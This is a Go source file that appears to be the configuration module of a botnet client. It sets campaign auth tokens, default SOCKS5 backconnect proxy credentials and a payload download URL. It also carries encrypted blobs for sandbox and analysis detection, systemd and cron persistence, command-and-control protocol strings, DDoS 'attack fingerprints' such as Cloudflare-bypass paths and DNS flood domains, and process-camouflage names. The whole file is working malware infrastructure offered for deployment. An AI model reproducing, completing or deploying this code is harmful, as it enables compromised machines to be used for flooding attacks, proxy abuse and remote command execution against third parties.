package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "46f8a5a2" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "jWwk&7Zfo&dHPbvB" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "v5.9" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("280f97a0ed6a87239e2746cf087c3fb9c891738b4c39e0701fedf1262de4d37bca4c748e7afb7b93806955a1") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("ac088b3b74236a30fa598b4190d82833327ddfa6d7689b7d4d7ea2df38f8146e9d731bcf51a3d84f398d6f3d5a2afe171a44b7e158e1d75f4baa9a07d6d0509f1cb627738def1f213def8ec144a72c28647105566a9b7e3f6dd785ca68acb4af298b5105fd15974abe462339ec82b756414838b871")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("fdded32255f159855107a95a3289f3842c88fed3527e636a9633a46d8afbc59b9217eb8696e9ab98ce344a9161bf1ff3878baef59983f6cbee99649193966a945dac58e50ae9e793034d")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("36444103fdc625cc2a5fbc161a315fc1157ee00762c9c23cc4c12c2be3068a1d")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("40b2b56063899693057a5d568ddb32102ef0d9f140ace144290897f8be")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("7e416092e8af2cdc84e0c78c50677a227c728289669bc4240f67dac356c93997c58798ec22")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("b986061182ba132507805db83f1bbe22aa6c5b7350c4bc2cc03795bc77a452")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("4334ec89b7a954addcd526b8c79f9865eebca6bb511896c608ddf19d69")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("3412d2eba2f2dae3bc4f2ddfeb152f527b22da82c89d25999672018a6564b359cc4945cb2cfc5ddea450e6de495b45fe42d29df0ce7451")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("8cf7345b16d2e6c2103d00422673cac411f201b2ad06a9620dd427d3faeb728947f93b")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("64f346c7425d6ca6dde0a2c87a2bea6b624d2ed309798c248e3c593322790901dd24bf773ac2817bc9066b2c9a3a44decd655166181533fc50e1864ff656fa991c216c530ec50ddc51eb274486a736d6db63720688d17d77591d81f104b7199a588ad42852e4328b857407505115bd462ab20dcf1c3c1f9dff1271ff7349731f891189eb2a5594ffb22c558ff97d5bd9e73edd8efcc4f102d6f9970f457a91ff3aa2aead11a2a7713c7a12abf880dedbb95e0f3bd2da2c925b7a0389e7d2a3a50aa0f4e6834281d1ada97e4ae19faa")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("0c8e2b4be2f48cf1b09c6ce9589e4d3a8ddc7c5e0934883790050709ba9d902ca6e6d192a6ae6642fb30a705e40d4f0d780a1d702641418d6eac75896921a931b9eda7817e98343ef2636e4989a751d6574c70f8e74ec7edc31de55b3be4608d91fb1bd738c799cc39d09223a8a6857b0650bcaa5cb67c417414292c013d73f282abce455b2ced7abc86e755dc1f969166a5a0c5ceeb20a9273fe51aead88f6bad6b0b7623696f8e1f6f88aaa44a5776fb1a337e724a890d424251ae5c11112a777ff93d980c")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("bb589907dfa99c692737cd5943a91af0f725e53285889f4d62")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("d0fc58d32cfb8b1d8d9a8a5787f01d91abef6f119a269fa66dd47813cf")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("a0d2ca3c28c100b3ee950eb5f8a9be04932a7559f95fd2b11fac20037830521471991e9e0fdae2")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("f59553620147e1939ac987520a271d4d909f5dd76d005e142e5895c0c8fb73b584878cc4435f1b40e53b96")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("d84d6b76a2a9ba1a4d01d52da27986652a0a9b136e3a4dc3eb89ec287d6d79")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("7aa291f8c78d71c3c2c4bb14fb4da280c41853fc40f05555ad9bed9d")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("41f42e60db6385e5142f985ac8e89a08ed0bc3e4dba51c6d47fe1749dde6556a8fba310a6a06bb0660e6802a6abdd1eb")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("2be6d45fb1521292aca93b67e10b791a54dcf0ae")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("185b0df5ab6a012e17a89091d5ae29efd5e5bc432a")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("08a2521bf4d1657fe385b6866bf97543e2e918e0a8b5d6baa6fa42aebd0ac5")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("5346eabfb86dca9c71951f94ced139afe8525192d3d6c949edd1")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("2010ff2f0ca4376a9ba737e53b98172673770bbb122236783b19b5")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("a142c7c7522bf386ce914d5f0501025911dce7a9adfbba0830fb9c")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("582d26cb86d7cf1c58572e815721b74da436d113ae0c75e68b617c8fcf3bb8")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("1882d0c07797739c8a032f2a09a36009dcaa6c2113976a838bb1eeaf83701b89b97eef0705a62a345c070c5537a5abfbb940299b92")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("9b7f3ed30b3e0e82aa10a379852de97cb96af7bad6d068b545")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("abe5bd9573304818f6b64e7725c17ab2d5e67e0865e8ca3af4ff721cbee06421a209")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("a5b94121d17e14616d99db5f5d12e2475e3e472e121599239f01cbdff74f175c20f032766fd28ea1b265e3aa4738")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("0391e3e7b7249e6c0612d49aa2cbb0d62c7ae5d4e86379b4f93addfe8c409e05a4c75740028f1864134d037a")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("0c25f27a468d68caa6436d5ce3f2dcc3cc945fe7c8f1cbc3e6ec117516bc05b8b8848579aa94683f17c6f818a234d466e5115eed036798087dfe")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("088c9ae37303e5f76b7366525ef261a3d00dcdc579ff9e456554128897201f2f")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("d3b69dab7aaeb3088e1ee46911eaa2fa6da35efb5c2238846a68f0c0383d5966f6695c14c68e0bbfff2816057cde11e0")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("0706e82db6af80fe2f67b29eac6068e3a3d27fe81ede96f57d52450ad4d7bbb98c0a37c057")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("b3038a4cba9304c4e5ecbd5ad1f6b14aec37166fd3955fcec9daa98191cd8eddcbf1ccd6ae68dbb59b2084255c7258")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("ac7e3e32850e1d8eeb29d840f446641d6fac0973cd3c4d6d38a4532723fbee443b0fa4ff5988badb0610a4385bfc438487bb50eb54ba05140c4c3eba1c989a5b76aacb4b863cb81023fde533a0424c6b612ac54aa6c45a1851429a4177ee4fa7927e92c5cf77a88eb28657048e6e475372")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("50ab0f7ad4d55cc84eddbf9d7b7c7d9090828322b0e12e4bc31353fb00f5e9ea6459254858df10791a2f3bb411e86a86cba076280b11ced73c0eb32ba88b8ce08c7498e0d1a654a9b5bbe678f925505cf8")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("90eae7616dfca253685ec7f316a722e2cef8b1f2e3d1d6118cbf4b5f2380da52ed40ea7ce5fe2dadcbc0af676980a14d815e98d2e4608304b9a3ebd6a9428fa9a7bbbfac525e455bb649700e9c21")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("cfe66765f6114f3296f046615fbf679d92cb66b4782afaa17534eb187e1864c961fdfd34e157144ab5abc57606134008892edc8b7fa73ff909a66047046de0c4672d314072114ddb721130b62f")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("bf1b9aacdab6348dffd1861a54266b43ac1a675197a666712fdc864b0f41234515da3b7ac5197a1e4ab37a507e55c0f49cc5c1857411c385d56942a1ecd269")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("c0b5d16433e6ba15113a068b50eecd984a54c428973af924cfff9b261ddda6df5e354c03")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("919d62442376b6fdd7277bdf2593170e96cc2f1023ada4bbbd6b88172b39b16fc8ee94cea4cd76e8d785981d1e7925a87c1c680ea10ad7f6cb8eb9e18d0a2292d0d3df323b67a2acb2fb23fed747630402eba7b29a42f358ca5f43c464cacaef6e08d7a2151c9376a9fe8e51d12492f821ebe1bfa13c35c74b786e7f44fd9e9044689610b9f66297ee4306330fe26c7f86014b7eda7441e77c2b6e687b85b8f7f7be25771227da2b982c01aeb8b8ca9ccd783746d853ec5238053652d306841b123ffd743cffafbe3c86944171aa3caf50727d4707b5d33faf1f3e110d")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("7a8f4e75fe647172eb9373c197f849fa4dbd7184dea0440ff61766e66f31596dbe304da0bfba8aefca52a845f88fed4f9260526fd7ffd6618cef6795f22c91fc09a00c5c2a88e124d34bd301a86496b9e8d4308e56cc2bf4df5613")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("87a32f2fe43768cce686c70c9c5642aaacdfe19ae7ccd4df1a5df4575e7a82be8681d90584bcb412e8e612e78d20ada88f5a1182eacce723906d07")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("2d9e6ccaafd5037da593655fe92e8ba19e3dd971e5d30f3ed23b1cb2a1de04b2c1ce806ed556ca713051bfdc7c0f1cd6e368a1b62bf2c20469f85f59210a95919ee6422100993600cc")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("0a235aae19b83efd44b2ad07e0dcd3386afbf2ddd9adae")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("3cbb3b092124ccae233d1c99f21f099bce519eead4d52b91f564f3f20e38e4188c0f")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("7d5936550932e7a71a28599539ed45cbd65391e0120ab24da1c0929133ab9c53707ad1de3e25c7ef48a19245de63d26281a7f10dc79ecc6bb5db9f0a534fd04d7ac7f14a3633e8af46d5d5e78fdfb4537ddab3b7cc3cfcbae5577399b52d25")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("8ca393122b018fa46917cc742e331b79817e")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("9792ef3253db7b43cec8e55974dbddb8f04692224ebc2739d07eede8848c533d6cc90e6a8da91448bce72440cd055e824b33729b14")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("7f8b5f82621c08efeebb131ea85348597a16")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("feabbc4b1bb08eafd4fa63e03360b8cefded")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("4579c3b573828dafb5576bb49e38a59593762bd4590b")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("65403aaa3ee1096067ae803fc0f962b4c0980faab81d48e0")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("5e3bb5309c630f2ec4577b576bfe320746bac00388")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("c7d1a803d89040b34b13b3de46c8ded23562")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("a292f245094c94298f2f03d36c6df8c8b8bb84636e4f9a968c")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("bea8726e372d39abe36bcbc9934403ae0efc75a49df358a1e3")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("0d81ef3e6b2f5c5a934f0691c20869f4c44b1b777df6e8")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("9af8aed86d59072a3a760e2c21c07e6e3941b112")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
